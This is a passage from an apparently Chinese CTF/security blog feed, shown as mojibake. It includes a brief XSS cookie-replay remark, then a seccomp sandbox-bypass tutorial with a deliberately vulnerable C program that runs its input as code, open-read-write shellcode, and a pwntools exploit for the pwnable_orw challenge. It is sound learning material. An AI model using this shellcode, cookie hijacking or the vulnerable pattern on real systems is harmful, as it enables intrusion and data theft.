data-src="/../capture_20241121210416731.bmp"></p><ul><li>æé†’æˆ‘ä»¬æ²¡ç™»é™†ï¼Œé‚£ä¹ˆç®€å•ï¼Œæˆ‘ä»¬æŠ“åŒ…ä¿®æ”¹<code>cookie</code>ä¸ºäº‘æœåŠ¡å™¨æ”¶åˆ°çš„<code>cookie</code>å³å¯:</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241121210558377.bmp"></p><p><mark>ä¸ºä»€ä¹ˆä¸åœ¨ä¸€ä¸ªç›®å½•å´ç”¨çš„æ˜¯åŒä¸€ä¸ªcookie<mark></mark></mark></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241122161119180.bmp"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Seccompå­¦ä¹ (2)</title>
      <link href="/2024/11/14/Seccomp%E5%AD%A6%E4%B9%A0-2/"/>
      <url>/2024/11/14/Seccomp%E5%AD%A6%E4%B9%A0-2/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>Seccomp(1)å·²ç»å¤§è‡´ä»‹ç»äº†ä¸€ä¸‹æ²™ç®±ï¼Œå¹¶ä¸”åœ¨æœ€åçš„ç»“å°¾å¤„æˆ‘è‡ªå·±è¿˜å†™äº†ä¸€ä¸ª<code>orw</code>çš„æºç ï¼Œç®€å•ä»‹ç»äº†ä¸€ä¸‹<code>orw</code>çš„æ±‡ç¼–ï¼Œè¿™ç¯‡æ–‡ç« ç®€å•ä»‹ç»ä¸€ä¸‹å¸¸è§çš„æ²™ç®±ç»•è¿‡æ–¹æ³•ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š<a class="link" href="https://blog.csdn.net/Nashi_Ko/article/details/120288385?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522FA51E007-58A1-4FF7-9564-3A72C2C1D786%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=FA51E007-58A1-4FF7-9564-3A72C2C1D786&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-120288385-null-null.142%5Ev100%5Epc_search_result_base8&utm_term=Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8%EF%BC%8832%E4%BD%8D%EF%BC%89&spm=1018.2226.3001.4187">Linux X86æ¶æ„ 32 64ç³»ç»Ÿè°ƒç”¨è¡¨ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>â¤ï¸â¤ï¸</p><h1 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h1><p>è¿˜æ˜¯å…ˆç®€å•ä»‹ç»ä¸€ä¸‹<code>ORW</code>ï¼Œä¸Šä¸€ç¯‡æ–‡ç« ä»‹ç»äº†64ä½çš„ï¼Œè¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹32ä½</p><h2 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h2><ul><li>å…ˆç¼–è¯‘æºç ï¼Œåœ¨å¼€å§‹ç¼–è¯‘32ä½ä¹‹å‰ï¼Œè¦å…ˆå®‰è£…32ä½çš„libseccompä»¥åŠå·¥å…·é“¾</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install libseccomp2:i386</span><br><span class="line">sudo apt install gcc-multilib g++-multilib</span><br></pre></td></tr></table></figure></div><ul><li>æºç ï¼š</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -g orw32.c -o orw32 -fno-stack-protector -no-pie -z execstack -m32 /usr/lib/i386-linux-gnu/libseccomp.so.2</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),<span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    seccomp();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x200</span>);</span><br><span class="line">    <span class="type">void</span> (*func)() = (<span class="type">void</span> (*)())buf;</span><br><span class="line">    func();<span class="comment">// ä¿®æ”¹ä¸ºå‡½æ•°æŒ‡é’ˆï¼Œæ–¹ä¾¿æµ‹è¯•</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x30</span>)</span><br></pre></td></tr></table></figure></div><ul><li><mark>readçš„3è¦æ³¨æ„<mark></mark></mark></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stdin</span> -&gt; <span class="number">0</span></span><br><span class="line"><span class="built_in">stdout</span> -&gt; <span class="number">1</span></span><br><span class="line"><span class="built_in">stderr</span> -&gt; <span class="number">2</span></span><br><span class="line">flag -&gt; <span class="number">3</span> <span class="comment">// ä»3å¼€å§‹ï¼Œfd(æ–‡ä»¶æè¿°ç¬¦)å°±æ˜¯å…¶ä»–æ–‡ä»¶äº†</span></span><br></pre></td></tr></table></figure></div><h3 id="æ‰‹å†™"><a href="#æ‰‹å†™" class="headerlink" title="æ‰‹å†™"></a>æ‰‹å†™</h3><p>1.è·å¾—â€flagâ€çš„å°ç«¯åº</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;flag&quot;</span>[::-<span class="number">1</span>].encode().<span class="built_in">hex</span>()</span><br><span class="line"><span class="string">&#x27;67616c66&#x27;</span></span><br></pre></td></tr></table></figure></div><p>2.shellcodeç›´æ¥å†™ï¼Œåœ¨å¼€å¤´æ¸…ç©ºäº†ä¸€ä¸ªå­—é•¿çš„esp</p><p>åªéœ€è¦è®°ä½ä¸‰ä¸ªå‚æ•°é¡ºåºæ˜¯<code>ebx,rcx,edx</code>ä»¥åŠå…¶æ‰€å¯¹åº”çš„å«ä¹‰ï¼Œåº”è¯¥è¿˜æ˜¯ä¸éš¾è®°çš„</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">shellcode = &#x27;&#x27;&#x27;</span><br><span class="line">push 1;</span><br><span class="line">dec byte ptr [esp];</span><br><span class="line">/* open(&#x27;flag&#x27;) */</span><br><span class="line">push 0x67616c66;</span><br><span class="line">mov ebx, esp;</span><br><span class="line">xor ecx, ecx;</span><br><span class="line">xor edx, edx;</span><br><span class="line">push 5;pop eax;</span><br><span class="line">int 0x80;</span><br><span class="line"></span><br><span class="line">/* read(3,&#x27;esp&#x27;,0x30) */</span><br><span class="line">mov ecx, esp;</span><br><span class="line">push 3; pop ebx;</span><br><span class="line">push 0x30; pop edx;</span><br><span class="line">push 3; pop eax;</span><br><span class="line">int 0x80;</span><br><span class="line"></span><br><span class="line">/* write(1,&#x27;esp&#x27;,0x30) */</span><br><span class="line">mov ecx, esp;</span><br><span class="line">push 1; pop ebx;</span><br><span class="line">push 0x30; pop edx;</span><br><span class="line">push 4; pop eax;</span><br><span class="line">int 0x80;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></div><blockquote><p><code>dec byte ptr [esp];</code>æ˜¯æŒ‡å°†espæŒ‡å‘çš„åœ°å€æ•°æ®-1</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901114138740-1731576519734-1.bmp"></p></blockquote><h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><p><a class="link" href="https://buuoj.cn/challenges#pwnable_orw">pwnable_orw <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>å’Œä¸Šé¢è®²è§£çš„å¯ä»¥è¯´æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œåªæ˜¯åœ¨å†™shellcodeå‰åŠ äº†ä¸€æ®µè¾“å‡ºï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ä¸€ç›´æ‰“ä¸é€šï¼Œä¸æ˜¯å¾ˆç†è§£ã€‚ä»¿ç…§ç€è‡ªå·±å†™ä¸€ä¸ªï¼Œä½†æ˜¯æ²¡å¼€canaryï¼Œæ²¡å¤ªå¤§å½±å“ã€‚</p><p><code>buuctf</code>æ²¡æ‰“é€šæ¢<code>pwnable</code>å»æ‰“ï¼š<a class="link" href="https://pwnable.tw/challenge/#2">https://pwnable.tw/challenge/#2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li>æºç ï¼š</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -g orw.c -o orw -fno-stack-protector -no-pie -z execstack -m32 /usr/lib/i386-linux-gnu/libseccomp.so.2</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),<span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    seccomp();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Have a try!!!!&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x200</span>);</span><br><span class="line">    <span class="type">void</span> (*func)() = (<span class="type">void</span> (*)())buf;</span><br><span class="line">    func();<span class="comment">// ä¿®æ”¹ä¸ºå‡½æ•°æŒ‡é’ˆï¼Œæ–¹ä¾¿æµ‹è¯•</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>EXP</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># *******************BUUCTF-Ubuntu16-libc-2.23********************* #</span></span><br><span class="line">libc = <span class="string">&quot;/home/pwn/Desktop/buuctf/libc/64bits/libc-2.23.so&quot;</span> <span class="comment"># ubuntu16</span></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment"># ***************************************************************** #</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># *******************BUUCTF-Ubuntu18-libc-2.27********************* #</span></span><br><span class="line"><span class="comment">#libc = &quot;/home/pwn/Desktop/buuctf/libc/64bits/libc-2.27.so&quot; # ubuntu18</span></span><br><span class="line"><span class="comment">#one = [0x4f2be,0x4f2c5,0x4f322,0x10a38c]</span></span><br><span class="line"><span class="comment"># ***************************************************************** #</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ***********GLibc-all-in-one-2.23********************************* #</span></span><br><span class="line"><span class="comment">#libc = &quot;/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;</span></span><br><span class="line"><span class="comment">#one = [0x4527a , 0xf03a4 , 0xf1247]</span></span><br><span class="line"><span class="comment"># ***************************************************************** #</span></span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;./orw&quot;</span></span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,)</span></span><br><span class="line">p = process(file)</span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,26902)</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;!!!!&quot;</span>,asm(shellcode))</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure></div><ul><li>æ•ˆæœï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241114174216250.bmp"></p><h2 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a>64ä½</h2><p>åœ¨<code>seccompå­¦ä¹ (1)</code>ä¸­ä¹Ÿä»‹ç»è¿‡äº†ï¼Œè¿ç”¨å…¶å®å’Œ32ä½ä¹Ÿæ²¡æœ‰åŒºåˆ«ï¼Œæ¯•ç«Ÿéƒ½æ˜¯ç”¨<code>pwntools</code>è‡ªå¸¦çš„æ¨¡å—ç”Ÿæˆï¼Œä¹Ÿæ— éœ€å…³å¿ƒç³»ç»Ÿè°ƒç”¨å·ã€‚</p><h1 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h1><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><ul><li>å®ƒèƒ½å¤Ÿå°†ä¸€ä¸ªæ–‡ä»¶æˆ–å…¶ä»–å¯¹è±¡æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œä½¿å¾—è¯¥æ–‡ä»¶çš„å†…å®¹å¯ä»¥åƒæ™®é€šå†…å­˜ä¸€æ ·è¿›è¡Œè¯»å–å’Œå†™å…¥æ“ä½œï¼Œè€Œä¸éœ€è¦é€šè¿‡æ ‡å‡†çš„ I&#x2F;O å‡½æ•°ï¼ˆå¦‚ <code>read</code> å’Œ <code>write</code>ï¼‰æ¥è¿›è¡Œæ–‡ä»¶æ“ä½œã€‚</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">mmap</span><span class="params">(<span class="type">void</span>* addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure></div><h3 id="å‚æ•°è§£æ"><a href="#å‚æ•°è§£æ" class="headerlink" title="å‚æ•°è§£æ"></a>å‚æ•°è§£æ</h3><ol><li>**<code>addr</code>**ï¼š<ul><li>è¯·æ±‚çš„å†…å­˜æ˜ å°„çš„èµ·å§‹åœ°å€ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¯ä»¥è®¾ç½®ä¸º <code>NULL</code>ï¼Œç”±æ“ä½œç³»ç»Ÿé€‰æ‹©åˆé€‚çš„åœ°å€æ¥æ˜ å°„ã€‚å¦‚æœæŒ‡å®šäº†ä¸€ä¸ªåœ°å€ï¼Œæ“ä½œç³»ç»Ÿä¼šå°è¯•å°†æ˜ å°„æ”¾åœ¨è¯¥åœ°å€å¼€å§‹çš„ä½ç½®ã€‚</li></ul></li><li>**<code>length</code>**ï¼š<ul><li>è¦æ˜ å°„çš„å†…å­˜åŒºåŸŸçš„é•¿åº¦ï¼ˆå­—èŠ‚æ•°ï¼‰ã€‚å¿…é¡»æ˜¯é¡µé¢å¤§å°çš„å€æ•°ï¼Œé¡µé¢å¤§å°é€šå¸¸æ˜¯ 4 KB æˆ– 8 KBã€‚</li></ul></li><li>**<code>prot</code>**ï¼š<ul><li>ä¿æŠ¤æ ‡å¿—ï¼ŒæŒ‡å®šæ˜ å°„åŒºåŸŸçš„è®¿é—®æƒé™ã€‚å¸¸è§çš„å€¼åŒ…æ‹¬ï¼š<ul><li><code>PROT_READ</code>ï¼šå…è®¸è¯»å–æ˜ å°„åŒºåŸŸçš„å†…å®¹ã€‚</li><li><code>PROT_WRITE</code>ï¼šå…è®¸å†™å…¥æ˜ å°„åŒºåŸŸçš„å†…å®¹ã€‚</li><li><code>PROT_EXEC</code>ï¼šå…è®¸æ‰§è¡Œæ˜ å°„åŒºåŸŸçš„ä»£ç ã€‚</li><li><code>PROT_NONE</code>ï¼šç¦æ­¢è®¿é—®è¯¥åŒºåŸŸã€‚</li></ul></li></ul></li><li>**<code>flags</code>**ï¼š<ul><li>æ˜ å°„åŒºåŸŸçš„è¡Œä¸ºå’Œç‰¹æ€§æ ‡å¿—ã€‚å¸¸è§çš„å€¼åŒ…æ‹¬ï¼š<ul><li><code>MAP_SHARED</code>ï¼šæ˜ å°„åŒºåŸŸå¯¹æ‰€æœ‰è¿›ç¨‹å…±äº«ï¼Œä¿®æ”¹ä¼šåæ˜ åˆ°æ–‡ä»¶æˆ–è®¾å¤‡ä¸­ã€‚</li><li><code>MAP_PRIVATE</code>ï¼šæ˜ å°„åŒºåŸŸä¸ºç§æœ‰çš„ï¼Œå¯¹è¿›ç¨‹å†…å­˜çš„ä¿®æ”¹ä¸ä¼šå†™å›åŸæ–‡ä»¶ã€‚</li><li><code>MAP_ANONYMOUS</code>ï¼šæ˜ å°„ä¸€ä¸ªåŒ¿åå†…å­˜åŒºåŸŸï¼ˆä¸ä¸ä»»ä½•æ–‡ä»¶å…³è”ï¼‰ã€‚</li><li><code>MAP_FIXED</code>ï¼šè¦æ±‚æ˜ å°„åˆ°æŒ‡å®šçš„åœ°å€ä½ç½®ï¼Œå¯èƒ½ä¼šè¦†ç›–ç°æœ‰çš„åœ°å€ç©ºé—´ã€‚</li></ul></li></ul></li><li>**<code>fd</code>**ï¼š<ul><li>æ–‡ä»¶æè¿°ç¬¦ï¼ŒæŒ‡å‘è¦æ˜ å°„çš„æ–‡ä»¶ã€‚å¦‚æœæ˜ å°„çš„æ˜¯åŒ¿åå†…å­˜åŒºåŸŸï¼Œåˆ™æ­¤å‚æ•°åº”ä¸º <code>-1</code>ã€‚</li></ul></li><li>**<code>offset</code>**ï¼š<ul><li>æ˜ å°„çš„èµ·å§‹åç§»é‡ï¼ˆå­—èŠ‚ï¼‰ã€‚è¿™ä¸ªåç§»é‡å¿…é¡»æ˜¯é¡µé¢å¤§å°çš„å€æ•°ï¼Œé€šå¸¸è®¾ç½®ä¸º 0ã€‚</li></ul></li></ol><h3 id="é€šå¸¸ç”¨æ³•"><a href="#é€šå¸¸ç”¨æ³•" class="headerlink" title="é€šå¸¸ç”¨æ³•"></a>é€šå¸¸ç”¨æ³•</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mmap(start, len, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment">// å°†è¿™å—åŒºåŸŸè®¾å®šä¸ºrxw</span></span><br></pre></td></tr></table></figure></div><p>ä¹‹å‰çš„é¢˜ç›®éƒ½æ˜¯ç›´æ¥å°†shellcodeå†™åˆ°æ 